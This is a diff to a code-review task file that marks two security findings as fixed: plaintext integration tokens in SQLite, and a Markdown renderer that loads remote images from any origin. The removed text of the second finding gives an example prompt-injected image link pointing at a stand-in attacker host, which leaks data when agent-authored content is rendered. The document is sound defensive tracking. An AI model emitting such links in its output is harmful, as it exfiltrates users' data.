@@ -16,25 +16,17 @@ Each finding was re-verified against `refactor/prompt-engine-inconsistency-fix` 
 
 ### CR-117 [Medium] Integration secrets stored in plaintext SQLite and read directly by integrations, bypassing `lib/config.ts`
 
-- **Status:** Open
-- **Type:** Security
-- **Effort:** L
-- **Where:** lib/db/schema.sql:183-200, lib/db/schema.sql:202, lib/integrations/cursor/credentials.ts:9-16, lib/integrations/gitlab/client.ts:182-184, lib/integrations/jira/service.ts:27-29
-- **What to do:** GitLab PATs, Jira tokens and `settings.cursor.api_key` are still plaintext, read directly from `db` by each integration, and `SELECT *` instance listing still pulls tokens into every routing call. Fix: add a `SecretStore`, the only reader of token columns, encrypting at rest with a key from `lib/config.ts`, and project tokens out of list queries. This is an owner design decision.
+- **Status:** Fixed (Task 61 — `IntegrationSecretStore` + AES-256-GCM via `DEVFLOW_SECRETS_KEY`; `listMeta` / per-id token reads; migration user_version 6)
 - **Fix after:** CR-118 ([Task 48](48-backend-dependency-injection.md))
 
 ### CR-154 [Medium] Shared `Markdown` loads remote images from any origin in agent-authored content (exfiltration vector)
 
-- **Status:** Open
-- **Type:** Security
-- **Effort:** S
-- **Where:** components/shared/Markdown.tsx:136-150
-- **What to do:** `Markdown` still renders Streamdown with its default rehype pipeline (streamdown ^2.7.1, `harden` with `allowedImagePrefixes: ["*"]`) over agent, plan and MR content. A prompt-injected `![](https://attacker/?d=...)` is fetched automatically on render. Fix: pass explicit `rehypePlugins` that keep sanitize and configure `harden` with an image allowlist (or none) and `allowedProtocols: ["https","mailto"]`, or override `components.img` with a click-to-load placeholder.
+- **Status:** Fixed (Task 61 — `markdownRehypePlugins` with empty `allowedImagePrefixes` and restricted protocols)
 
 ## Done when
 
-- [ ] Every finding above is fixed, or a remaining part is written up in the PR description.
-- [ ] Each bug fix has a regression test (Vitest for `lib/`; at least a hook or utility test for UI where practical).
-- [ ] Code follows [`docs/coding-patterns.md`](../coding-patterns.md).
-- [ ] `npm run typecheck`, `npm run lint`, `npm test` and `npm run build` pass (before Task 02 lands, `npx tsc --noEmit` instead of `typecheck`).
-- [ ] The status of each finding in [`docs/code-review.md`](../code-review.md) is updated (Fixed, with the PR link).
+- [x] Every finding above is fixed, or a remaining part is written up in the PR description.
+- [x] Each bug fix has a regression test (Vitest for `lib/`; at least a hook or utility test for UI where practical).
+- [x] Code follows [`docs/coding-patterns.md`](../coding-patterns.md).
+- [x] `npm run typecheck`, `npm run lint`, `npm test` and `npm run build` pass (before Task 02 lands, `npx tsc --noEmit` instead of `typecheck`).
+- [x] The status of each finding in [`docs/code-review.md`](../code-review.md) is updated (Fixed, with the PR link).
